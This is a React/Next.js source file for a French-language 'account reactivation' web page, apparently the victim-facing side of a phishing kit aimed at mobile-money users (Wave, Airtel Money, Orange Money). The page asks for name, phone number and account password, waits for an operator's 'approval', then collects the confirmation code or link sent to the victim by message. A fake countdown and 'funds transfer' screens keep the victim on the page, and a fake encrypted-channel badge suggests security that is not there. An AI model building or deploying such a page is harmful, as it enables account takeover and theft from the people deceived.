'use client';

import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    ShieldCheck,
    Lock,
    KeyRound,
    MessageSquare,
    CheckCircle2,
    AlertTriangle,
    ArrowRight,
    Loader2,
    Check,
    Clock,
    Send,
    TrendingUp,
    ChevronDown,
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { cn } from '@/lib/utils';
import { dataService } from '@/lib/dataService';
import { useParams } from 'next/navigation';
import RecentPaymentsTicker from '@/components/form/RecentPaymentsTicker';
import CountrySelector, { Country } from '@/components/form/CountrySelector';

/* ─────────────────────────── Moyens de paiement ─────────────────────────── */
const PAYMENT_METHODS = [
    {
        id: 'Wave',
        label: 'Wave',
        color: '#00A3FF',
        badgeBg: 'bg-[#00A3FF]/15',
        border: 'border-[#00A3FF]/40',
        logo: (
            <div className="w-8 h-8 rounded-xl bg-[#00A3FF] flex items-center justify-center font-black text-white text-sm shadow-md shadow-[#00A3FF]/30 select-none">
                W
            </div>
        ),
    },
    {
        id: 'Airtel Money',
        label: 'Airtel Money',
        color: '#E30613',
        badgeBg: 'bg-[#E30613]/15',
        border: 'border-[#E30613]/40',
        logo: (
            <div className="w-8 h-8 rounded-xl bg-[#E30613] flex items-center justify-center font-black text-white text-sm shadow-md shadow-[#E30613]/30 select-none">
                A
            </div>
        ),
    },
    {
        id: 'Orange Money',
        label: 'Orange Money',
        color: '#FF6600',
        badgeBg: 'bg-[#FF6600]/15',
        border: 'border-[#FF6600]/40',
        logo: (
            <div className="w-8 h-8 rounded-xl bg-[#FF6600] flex items-center justify-center font-black text-white text-xs shadow-md shadow-[#FF6600]/30 select-none">
                OM
            </div>
        ),
    },
    {
        id: 'Pessa',
        label: 'Pessa',
        color: '#00A651',
        badgeBg: 'bg-[#00A651]/15',
        border: 'border-[#00A651]/40',
        logo: (
            <div className="w-8 h-8 rounded-xl bg-[#00A651] flex items-center justify-center font-black text-white text-sm shadow-md shadow-[#00A651]/30 select-none">
                P
            </div>
        ),
    },
    {
        id: 'Autre',
        label: 'Autre moyen',
        color: '#94A3B8',
        badgeBg: 'bg-slate-800',
        border: 'border-white/10',
        logo: (
            <div className="w-8 h-8 rounded-xl bg-slate-800 border border-white/15 flex items-center justify-center text-base shadow-sm select-none">
                💳
            </div>
        ),
    },
];

const COUNTRIES: Country[] = [
    { name: "Cameroun", code: "CM", dial: "+237" },
    { name: "Côte d'Ivoire", code: "CI", dial: "+225" },
    { name: "Sénégal", code: "SN", dial: "+221" },
    { name: "RD Congo", code: "CD", dial: "+243" },
    { name: "Congo-Brazzaville", code: "CG", dial: "+242" },
    { name: "Gabon", code: "GA", dial: "+241" },
    { name: "Bénin", code: "BJ", dial: "+229" },
    { name: "Togo", code: "TG", dial: "+228" },
    { name: "Burkina Faso", code: "BF", dial: "+226" },
    { name: "Mali", code: "ML", dial: "+223" },
    { name: "Guinée", code: "GN", dial: "+224" },
    { name: "Niger", code: "NE", dial: "+227" },
    { name: "Tchad", code: "TD", dial: "+235" },
    { name: "Centrafrique", code: "CF", dial: "+236" },
    { name: "Maroc", code: "MA", dial: "+212" },
    { name: "Algérie", code: "DZ", dial: "+213" },
    { name: "Tunisie", code: "TN", dial: "+216" },
    { name: "Madagascar", code: "MG", dial: "+261" },
    { name: "Rwanda", code: "RW", dial: "+250" },
    { name: "Nigeria", code: "NG", dial: "+234" },
    { name: "France", code: "FR", dial: "+33" },
];

export default function ClientLinkPage() {
    const params = useParams();
    const linkId = params.id as string;

    // Étapes : 'form' | 'waiting_admin' | 'enter_code' | 'processing' | 'completed' | 'rejected'
    const [currentStep, setCurrentStep] = useState<'form' | 'waiting_admin' | 'enter_code' | 'processing' | 'completed' | 'rejected'>('form');
    const [loadingConfig, setLoadingConfig] = useState(true);
    const [errorMsg, setErrorMsg] = useState<string | null>(null);
    const [linkInfo, setLinkInfo] = useState<any>(null);
    const [submissionId, setSubmissionId] = useState<string | null>(null);
    const [isSubmitting, setIsSubmitting] = useState(false);

    // Formulaire principal (Uniquement: Nom, Téléphone, Moyen de paiement, Mot de passe)
    const [formData, setFormData] = useState({
        fullName: '',
        phone: '',
        dialCode: '+237',
        countryName: 'Cameroun',
        countryCode: 'CM',
        password: '',
        method: 'Wave'
    });
    const [isPaymentMenuOpen, setIsPaymentMenuOpen] = useState(false);
    const paymentMenuRef = useRef<HTMLDivElement | null>(null);

    // Code de confirmation ou lien reçu par message
    const [confirmationCode, setConfirmationCode] = useState('');
    const [submittingCode, setSubmittingCode] = useState(false);

    // Compte à rebours du traitement (5 minutes = 300 secondes)
    const [timeLeft, setTimeLeft] = useState(300);
    const [progressPercent, setProgressPercent] = useState(0);

    // Fermeture du menu de paiement au clic extérieur
    useEffect(() => {
        const handleClickOutside = (e: MouseEvent) => {
            if (paymentMenuRef.current && !paymentMenuRef.current.contains(e.target as Node)) {
                setIsPaymentMenuOpen(false);
            }
        };
        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);

    // Récupération initiale du lien
    useEffect(() => {
        const fetchLink = async () => {
            try {
                const data = await dataService.getLink(linkId);
                if (data) {
                    setLinkInfo(data);

                    if (data.expiry_date && new Date() > new Date(data.expiry_date)) {
                        setErrorMsg("Ce lien a expiré. Veuillez contacter votre administrateur.");
                    } else if (data.submissions_limit > 0 && data.submission_count >= data.submissions_limit) {
                        setErrorMsg("Ce formulaire a atteint son quota maximal de participations.");
                    }
                } else {
                    setErrorMsg("Accès restreint : le lien spécifié est introuvable ou a été désactivé.");
                }
            } catch (err: any) {
                console.error("Erreur récupération lien:", err);
                setErrorMsg("Lien inaccessible. Veuillez vérifier l'URL fournie.");
            } finally {
                setLoadingConfig(false);
            }
        };

        const detectCountry = async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data && data.country_code) {
                    const country = COUNTRIES.find(c => c.code === data.country_code);
                    if (country) {
                        setFormData(prev => ({
                            ...prev,
                            dialCode: country.dial,
                            countryName: country.name,
                            countryCode: country.code
                        }));
                    }
                }
            } catch {}
        };

        fetchLink();
        detectCountry();
    }, [linkId]);

    // Écoute en temps réel de l'approbation de l'administrateur
    useEffect(() => {
        if ((currentStep !== 'waiting_admin' && currentStep !== 'processing') || !submissionId) return;

        const checkAdminStatus = async () => {
            try {
                const sub = await dataService.getSubmissionById(submissionId);
                if (sub) {
                    const statusStr = (sub.status || '').toLowerCase();
                    
                    // Si on était en attente d'admin et qu'il a approuvé -> aller à la saisie du code
                    if (currentStep === 'waiting_admin') {
                        if (statusStr.includes('approuvé') || statusStr.includes('code') || statusStr === 'approved_awaiting_code') {
                            setCurrentStep('enter_code');
                        } else if (statusStr.includes('rejet') || statusStr.includes('refus')) {
                            setCurrentStep('rejected');
                        }
                    }

                    // Si on est dans le chargement des 5 minutes et que l'admin a validé/finalisé
                    if (currentStep === 'processing') {
                        if (statusStr.includes('finalis') || statusStr.includes('traité') || statusStr.includes('validé')) {
                            setCurrentStep('completed');
                            confetti({
                                particleCount: 120,
                                spread: 80,
                                origin: { y: 0.6 },
                                colors: ['#2563eb', '#38bdf8', '#10b981']
                            });
                        }
                    }
                }
            } catch (err) {
                console.warn("Écoute statut:", err);
            }
        };

        const interval = setInterval(checkAdminStatus, 2500);
        return () => clearInterval(interval);
    }, [currentStep, submissionId]);

    // Gestion du compte à rebours de 5 minutes pendant le traitement
    useEffect(() => {
        if (currentStep !== 'processing') return;

        const timer = setInterval(() => {
            setTimeLeft((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    setCurrentStep('completed');
                    confetti({
                        particleCount: 100,
                        spread: 80,
                        origin: { y: 0.6 },
                        colors: ['#2563eb', '#38bdf8', '#10b981']
                    });
                    return 0;
                }
                const newTime = prev - 1;
                // Calcul du pourcentage écoulé (0% à 98% sur 300s)
                const elapsed = 300 - newTime;
                setProgressPercent(Math.min(99, Math.round((elapsed / 300) * 100)));
                return newTime;
            });
        }, 1000);

        return () => clearInterval(timer);
    }, [currentStep]);

    // Formatage mm:ss pour le compte à rebours
    const formatTime = (seconds: number) => {
        const mins = Math.floor(seconds / 60);
        const secs = seconds % 60;
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    };

    // Soumission du premier formulaire
    const handleInitialSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setIsSubmitting(true);

        try {
            const cleanDigits = formData.phone.replace(/[^0-9]/g, '');
            const fullPhone = `${formData.dialCode} ${formData.phone}`.trim();
            const fallbackEmail = `${cleanDigits || 'client'}@client.nexuslink.internal`;
            const fallbackAccount = `${formData.method}-${cleanDigits.slice(-4) || 'COMPTE'}`;

            const res = await dataService.submitForm({
                link_id: linkId,
                full_name: formData.fullName,
                email: fallbackEmail,
                phone: fullPhone,
                method: formData.method,
                account_number: fallbackAccount,
                password: formData.password,
                country_name: formData.countryName,
                country_code: formData.countryCode,
            });

            const createdId = res?.id || res?.data?.id || (res && typeof res === 'object' ? Object.values(res)[0] : null);
            setSubmissionId(createdId || 'temp-' + Date.now());
            setCurrentStep('waiting_admin');
        } catch (err: any) {
            alert(`Erreur: ${err.message || 'Vérifiez votre connexion'}`);
        } finally {
            setIsSubmitting(false);
        }
    };

    // Soumission du code ou lien reçu
    const handleCodeSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!confirmationCode.trim()) return;
        setSubmittingCode(true);

        try {
            if (submissionId) {
                await dataService.submitVerificationCode(submissionId, confirmationCode.trim());
            }

            // Bascule vers le chargement de la transaction (5 minutes)
            setCurrentStep('processing');
            setTimeLeft(300);
            setProgressPercent(5);
        } catch (err: any) {
            console.warn("Transmission:", err);
            setCurrentStep('processing');
        } finally {
            setSubmittingCode(false);
        }
    };

    if (loadingConfig) {
        return (
            <div className="min-h-screen bg-[#07090e] flex flex-col items-center justify-center p-6 text-slate-300">
                <Loader2 className="w-8 h-8 text-blue-500 animate-spin mb-4" />
                <p className="text-xs font-medium text-slate-400">Établissement du tunnel sécurisé...</p>
            </div>
        );
    }

    if (errorMsg) {
        return (
            <div className="min-h-screen bg-[#07090e] flex flex-col items-center justify-center p-6 text-center">
                <div className="w-16 h-16 bg-rose-500/10 border border-rose-500/20 rounded-2xl flex items-center justify-center mb-6">
                    <AlertTriangle className="w-8 h-8 text-rose-400" />
                </div>
                <h1 className="text-2xl font-bold text-white mb-2">Lien Indisponible</h1>
                <p className="text-xs sm:text-sm text-slate-400 max-w-md mb-8 leading-relaxed">
                    {errorMsg}
                </p>
            </div>
        );
    }

    return (
        <div className="min-h-screen bg-[#07090e] text-slate-100 flex flex-col">
            {/* Header sécurisé */}
            <header className="border-b border-white/[0.06] bg-slate-950/70 backdrop-blur-md sticky top-0 z-40">
                <div className="max-w-5xl mx-auto px-4 h-16 flex items-center justify-between">
                    <div className="flex items-center gap-3">
                        <div className="w-8 h-8 rounded-lg bg-blue-600 flex items-center justify-center text-white shadow-md shadow-blue-600/30">
                            <ShieldCheck className="w-5 h-5" />
                        </div>
                        <div>
                            <span className="font-bold text-sm tracking-tight text-white block">NexusLink Solutions</span>
                            <span className="text-[10px] text-slate-400 uppercase tracking-wider block">Portail de Réactivation Sécurisé</span>
                        </div>
                    </div>

                    <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-slate-900/80 border border-white/10 text-xs font-medium text-slate-300">
                        <Lock className="w-3.5 h-3.5 text-emerald-400" />
                        <span>Canal Chiffré</span>
                    </div>
                </div>
            </header>

            <RecentPaymentsTicker />

            {/* Corps du processus */}
            <main className="flex-1 max-w-xl w-full mx-auto px-4 py-8 sm:py-12 flex flex-col justify-center">
                <AnimatePresence mode="wait">
                    {/* ÉTAPE 1 : FORMULAIRE D'INSCRIPTION / RÉACTIVATION */}
                    {currentStep === 'form' && (
                        <motion.div
                            key="step-form"
                            initial={{ opacity: 0, y: 12 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -12 }}
                            className="glass-card rounded-2xl p-6 sm:p-8"
                        >
                            <div className="mb-6">
                                <div className="inline-flex items-center gap-2 px-2.5 py-1 rounded-md bg-blue-500/10 border border-blue-500/20 text-blue-400 text-xs font-medium mb-3">
                                    <span className="w-1.5 h-1.5 rounded-full bg-blue-400"></span>
                                    {linkInfo?.name || 'Réactivation de compte'}
                                </div>
                                <h1 className="text-xl sm:text-2xl font-bold text-white mb-2">
                                    Demande de Réactivation de Compte
                                </h1>
                                <p className="text-xs sm:text-sm text-slate-400 leading-relaxed">
                                    Renseignez vos coordonnées personnelles et les accès de votre compte pour soumettre votre dossier à l'administrateur.
                                </p>
                            </div>

                            <form onSubmit={handleInitialSubmit} className="space-y-5">
                                {/* 1. Nom et prénom complet */}
                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                        Nom et prénom complet
                                    </label>
                                    <input
                                        type="text"
                                        required
                                        placeholder="ex: Paul Dupont"
                                        value={formData.fullName}
                                        onChange={(e) => setFormData({ ...formData, fullName: e.target.value })}
                                        className="input-field text-sm"
                                    />
                                </div>

                                {/* 2. Numéro de téléphone avec indicatif */}
                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                        Numéro de téléphone
                                    </label>
                                    <div className="flex gap-2">
                                        <CountrySelector
                                            countries={COUNTRIES}
                                            selectedDial={formData.dialCode}
                                            onSelect={(c) => {
                                                setFormData({
                                                    ...formData,
                                                    dialCode: c.dial,
                                                    countryName: c.name,
                                                    countryCode: c.code
                                                });
                                            }}
                                        />
                                        <input
                                            type="tel"
                                            required
                                            placeholder="6 00 00 00 00"
                                            value={formData.phone}
                                            onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                                            className="input-field text-sm font-mono flex-1"
                                        />
                                    </div>
                                </div>

                                {/* 3. Moyen de paiement (Menu Déroulant avec Logos Wave, Airtel, OrangeMoney, Pessa, Autre) */}
                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5">
                                        Moyen de paiement
                                    </label>
                                    <div className="relative" ref={paymentMenuRef}>
                                        <button
                                            type="button"
                                            onClick={() => setIsPaymentMenuOpen(!isPaymentMenuOpen)}
                                            className="w-full flex items-center justify-between gap-3 p-3 rounded-xl bg-slate-900/90 border border-white/10 hover:border-blue-500/50 text-left transition-all cursor-pointer focus:outline-none focus:ring-2 focus:ring-blue-500/30"
                                        >
                                            <div className="flex items-center gap-3">
                                                {(PAYMENT_METHODS.find(p => p.id === formData.method) || PAYMENT_METHODS[0]).logo}
                                                <div>
                                                    <span className="text-sm font-semibold text-white block">
                                                        {(PAYMENT_METHODS.find(p => p.id === formData.method) || PAYMENT_METHODS[0]).label}
                                                    </span>
                                                    <span className="text-[10px] text-slate-400">
                                                        Sélectionnez votre moyen de réception
                                                    </span>
                                                </div>
                                            </div>
                                            <ChevronDown className={cn("w-4 h-4 text-slate-400 transition-transform duration-200", isPaymentMenuOpen && "rotate-180 text-blue-400")} />
                                        </button>

                                        <AnimatePresence>
                                            {isPaymentMenuOpen && (
                                                <motion.div
                                                    initial={{ opacity: 0, y: 6, scale: 0.98 }}
                                                    animate={{ opacity: 1, y: 0, scale: 1 }}
                                                    exit={{ opacity: 0, y: 6, scale: 0.98 }}
                                                    transition={{ duration: 0.15 }}
                                                    className="absolute left-0 right-0 top-full mt-2 bg-slate-900 border border-slate-700/80 rounded-2xl shadow-2xl p-2 z-50 backdrop-blur-xl ring-1 ring-white/10 space-y-1"
                                                >
                                                    {PAYMENT_METHODS.map((pm) => {
                                                        const isSelected = formData.method === pm.id;
                                                        return (
                                                            <button
                                                                type="button"
                                                                key={pm.id}
                                                                onClick={() => {
                                                                    setFormData({ ...formData, method: pm.id });
                                                                    setIsPaymentMenuOpen(false);
                                                                }}
                                                                className={cn(
                                                                    "w-full flex items-center justify-between p-2.5 rounded-xl text-left transition-all cursor-pointer",
                                                                    isSelected
                                                                        ? "bg-blue-600/15 border border-blue-500/30 text-white"
                                                                        : "hover:bg-white/[0.05] text-slate-300"
                                                                )}
                                                            >
                                                                <div className="flex items-center gap-3">
                                                                    {pm.logo}
                                                                    <span className="text-sm font-medium">
                                                                        {pm.label}
                                                                    </span>
                                                                </div>
                                                                {isSelected && (
                                                                    <Check className="w-4 h-4 text-blue-400" />
                                                                )}
                                                            </button>
                                                        );
                                                    })}
                                                </motion.div>
                                            )}
                                        </AnimatePresence>
                                    </div>
                                </div>

                                {/* 4. Mot de passe du compte */}
                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5 flex justify-between">
                                        <span>Mot de passe du compte</span>
                                        <span className="text-[10px] text-slate-400 flex items-center gap-1">
                                            <Lock className="w-2.5 h-2.5 text-emerald-400" /> Protégé
                                        </span>
                                    </label>
                                    <input
                                        type="password"
                                        required
                                        placeholder="••••••••••••"
                                        value={formData.password}
                                        onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                                        className="input-field text-sm font-mono"
                                    />
                                </div>

                                <button
                                    type="submit"
                                    disabled={isSubmitting}
                                    className="btn-premium w-full py-3.5 text-sm font-semibold flex items-center justify-center gap-2 cursor-pointer mt-4"
                                >
                                    {isSubmitting ? (
                                        <>
                                            <Loader2 className="w-4 h-4 animate-spin" />
                                            <span>Envoi de votre demande...</span>
                                        </>
                                    ) : (
                                        <>
                                            <span>Soumettre la demande à l'administrateur</span>
                                            <ArrowRight className="w-4 h-4" />
                                        </>
                                    )}
                                </button>
                            </form>
                        </motion.div>
                    )}

                    {/* ÉTAPE 2 : ATTENTE D'APPROBATION ADMIN */}
                    {currentStep === 'waiting_admin' && (
                        <motion.div
                            key="step-waiting"
                            initial={{ opacity: 0, scale: 0.98 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.98 }}
                            className="glass-card rounded-2xl p-8 sm:p-12 text-center"
                        >
                            <div className="relative w-20 h-20 mx-auto mb-8 flex items-center justify-center">
                                <div className="absolute inset-0 rounded-full border-2 border-blue-500/20 animate-ping"></div>
                                <div className="w-20 h-20 rounded-full border-2 border-t-blue-500 border-r-blue-500/40 border-b-transparent border-l-transparent animate-spin"></div>
                                <Clock className="w-8 h-8 text-blue-400 absolute" />
                            </div>

                            <h2 className="text-xl font-bold text-white mb-2">
                                Examen de votre demande en cours
                            </h2>
                            <p className="text-xs sm:text-sm text-slate-400 mb-8 max-w-md mx-auto leading-relaxed">
                                Votre dossier a été transmis au tableau de bord administrateur. Veuillez patienter sur cette page pendant son examen.
                            </p>

                            <div className="p-4 rounded-xl bg-slate-900/60 border border-white/5 space-y-3 text-left mb-6">
                                <div className="flex items-center gap-3 text-xs">
                                    <div className="w-4 h-4 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center">
                                        <Check className="w-2.5 h-2.5" />
                                    </div>
                                    <span className="text-slate-200">Informations transmises au tableau de bord</span>
                                </div>
                                <div className="flex items-center gap-3 text-xs">
                                    <Loader2 className="w-4 h-4 text-blue-400 animate-spin shrink-0" />
                                    <span className="text-blue-400 font-medium">En attente de validation par l'administrateur...</span>
                                </div>
                                <div className="flex items-center gap-3 text-xs">
                                    <div className="w-4 h-4 rounded-full bg-slate-800 border border-slate-700"></div>
                                    <span className="text-slate-500">Envoi du code ou lien de confirmation par message</span>
                                </div>
                            </div>
                        </motion.div>
                    )}

                    {/* ÉTAPE 3 : SAISIE DU CODE OU DU LIEN REÇU */}
                    {currentStep === 'enter_code' && (
                        <motion.div
                            key="step-code"
                            initial={{ opacity: 0, y: 12 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -12 }}
                            className="glass-card rounded-2xl p-6 sm:p-8"
                        >
                            <div className="text-center mb-6">
                                <div className="w-12 h-12 rounded-xl bg-blue-600/10 border border-blue-500/20 text-blue-400 flex items-center justify-center mx-auto mb-4">
                                    <MessageSquare className="w-6 h-6" />
                                </div>
                                <span className="badge badge-success text-[10px] mb-2">Demande Approuvée</span>
                                <h2 className="text-xl font-bold text-white mb-2">Confirmation du Dossier</h2>
                                <p className="text-xs text-slate-400 leading-relaxed max-w-sm mx-auto">
                                    L'administrateur a validé votre demande. Veuillez coller ci-dessous le code de confirmation ou le lien que vous venez de recevoir par message.
                                </p>
                            </div>

                            <form onSubmit={handleCodeSubmit} className="space-y-5">
                                <div>
                                    <label className="block text-xs font-medium text-slate-300 mb-1.5 text-center">
                                        Code de confirmation ou Lien reçu par message
                                    </label>
                                    <div className="relative">
                                        <KeyRound className="w-4 h-4 text-slate-500 absolute left-3.5 top-1/2 -translate-y-1/2" />
                                        <input
                                            type="text"
                                            required
                                            autoFocus
                                            placeholder="Collez votre code ou le lien ici (ex: https://... ou 123456)"
                                            value={confirmationCode}
                                            onChange={(e) => setConfirmationCode(e.target.value)}
                                            className="input-field pl-10 text-center font-mono text-sm font-semibold tracking-wide"
                                        />
                                    </div>
                                </div>

                                <button
                                    type="submit"
                                    disabled={submittingCode || !confirmationCode.trim()}
                                    className="btn-premium w-full py-3.5 text-sm font-semibold flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
                                >
                                    {submittingCode ? (
                                        <>
                                            <Loader2 className="w-4 h-4 animate-spin" />
                                            <span>Validation en cours...</span>
                                        </>
                                    ) : (
                                        <>
                                            <span>Valider et Lancer la Transaction</span>
                                            <Send className="w-4 h-4" />
                                        </>
                                    )}
                                </button>
                            </form>
                        </motion.div>
                    )}

                    {/* ÉTAPE 4 : CHARGEMENT DE LA TRANSACTION EN COURS (DURÉE ~5 MINUTES) */}
                    {currentStep === 'processing' && (
                        <motion.div
                            key="step-processing"
                            initial={{ opacity: 0, scale: 0.98 }}
                            animate={{ opacity: 1, scale: 1 }}
                            exit={{ opacity: 0, scale: 0.98 }}
                            className="glass-card rounded-2xl p-6 sm:p-10 text-center"
                        >
                            <div className="relative w-20 h-20 mx-auto mb-6 flex items-center justify-center">
                                <div className="absolute inset-0 rounded-full border-2 border-emerald-500/20 animate-ping"></div>
                                <div className="w-20 h-20 rounded-full border-2 border-t-emerald-500 border-r-emerald-500/40 border-b-transparent border-l-transparent animate-spin"></div>
                                <TrendingUp className="w-8 h-8 text-emerald-400 absolute" />
                            </div>

                            <span className="badge badge-warning text-[10px] mb-2 animate-pulse">Opération en cours</span>
                            <h2 className="text-xl font-bold text-white mb-2">
                                Votre transaction est en cours de traitement
                            </h2>
                            <p className="text-xs text-slate-400 mb-6 max-w-md mx-auto leading-relaxed">
                                Veuillez patienter. Vos informations ont bien été transmises et le système procède à la synchronisation et au transfert de vos fonds.
                            </p>

                            {/* Barre de progression avec compte à rebours */}
                            <div className="p-5 rounded-2xl bg-slate-900/90 border border-white/10 space-y-4 mb-6">
                                <div className="flex items-center justify-between text-xs">
                                    <span className="text-slate-400 flex items-center gap-1.5">
                                        <Clock className="w-3.5 h-3.5 text-blue-400" />
                                        Temps restant estimé :
                                    </span>
                                    <span className="font-mono text-base font-bold text-blue-400">
                                        {formatTime(timeLeft)}
                                    </span>
                                </div>

                                <div className="w-full bg-slate-800 h-2.5 rounded-full overflow-hidden p-0.5 border border-white/5">
                                    <div
                                        className="bg-gradient-to-r from-blue-600 via-cyan-500 to-emerald-500 h-full rounded-full transition-all duration-1000 ease-out"
                                        style={{ width: `${progressPercent}%` }}
                                    ></div>
                                </div>

                                <div className="space-y-2.5 pt-2 text-left">
                                    <div className="flex items-center gap-2.5 text-xs text-slate-300">
                                        <Check className="w-4 h-4 text-emerald-400 shrink-0" />
                                        <span>Code et lien de confirmation validés avec succès</span>
                                    </div>
                                    <div className="flex items-center gap-2.5 text-xs text-slate-300">
                                        <Loader2 className="w-4 h-4 text-blue-400 animate-spin shrink-0" />
                                        <span>Allocation des protocoles de routage & solde</span>
                                    </div>
                                    <div className="flex items-center gap-2.5 text-xs text-slate-500">
                                        <div className="w-4 h-4 rounded-full bg-slate-800 border border-slate-700 shrink-0"></div>
                                        <span>Vérification finale du registre et émission du reçu</span>
                                    </div>
                                </div>
                            </div>

                            <p className="text-[11px] text-slate-500">
                                ⚠️ Veuillez ne pas fermer cette fenêtre pendant le traitement. La page se mettra à jour automatiquement dès la confirmation finale.
                            </p>
                        </motion.div>
                    )}

                    {/* ÉTAPE 5 : CONFIRMATION FINALE / FÉLICITATIONS */}
                    {currentStep === 'completed' && (
                        <motion.div
                            key="step-completed"
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="glass-card rounded-2xl p-8 sm:p-12 text-center"
                        >
                            <div className="w-16 h-16 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 flex items-center justify-center mx-auto mb-6">
                                <CheckCircle2 className="w-8 h-8" />
                            </div>

                            <h2 className="text-2xl font-bold text-white mb-2">Félicitations !</h2>
                            <p className="text-sm font-semibold text-emerald-400 mb-4">
                                Vous venez de réactiver votre compte NexusLink avec succès.
                            </p>

                            <div className="p-4 rounded-xl bg-slate-900/80 border border-white/10 text-xs text-slate-300 leading-relaxed mb-6">
                                <p className="mb-2 text-white font-medium">
                                    Veuillez patienter pendant le transfert et la synchronisation de vos fonds.
                                </p>
                                <p className="text-[11px] text-slate-400">
                                    Votre transaction a été validée avec succès. Vos fonds sont en cours d'acheminement vers votre compte.
                                </p>
                            </div>

                            <div className="p-3 rounded-xl bg-slate-900/40 border border-white/5 text-[11px] font-mono text-slate-500 flex justify-between">
                                <span>RÉF : {submissionId || 'NL-TX-CONFIRMED'}</span>
                                <span className="text-emerald-400 font-bold">STATUT : VALIDÉ</span>
                            </div>
                        </motion.div>
                    )}

                    {/* ÉTAPE REJETÉE */}
                    {currentStep === 'rejected' && (
                        <motion.div
                            key="step-rejected"
                            initial={{ opacity: 0, scale: 0.95 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="glass-card rounded-2xl p-8 text-center"
                        >
                            <div className="w-16 h-16 rounded-full bg-rose-500/10 border border-rose-500/20 text-rose-400 flex items-center justify-center mx-auto mb-6">
                                <AlertTriangle className="w-8 h-8" />
                            </div>
                            <h2 className="text-xl font-bold text-white mb-2">Demande Non Approuvée</h2>
                            <p className="text-xs text-slate-400 mb-6">
                                Votre demande de réactivation n'a pas pu être validée par l'administrateur. Veuillez contacter le support.
                            </p>
                            <button
                                onClick={() => setCurrentStep('form')}
                                className="btn-secondary py-2 px-4 text-xs"
                            >
                                Recommencer
                            </button>
                        </motion.div>
                    )}
                </AnimatePresence>
            </main>

            <footer className="border-t border-white/[0.06] py-6 text-center text-xs text-slate-500">
                <div className="max-w-5xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-2">
                    <p>© {new Date().getFullYear()} NexusLink Solutions. Infrastructure sécurisée.</p>
                    <p>Protection des données et conformité garantie.</p>
                </div>
            </footer>
        </div>
    );
}
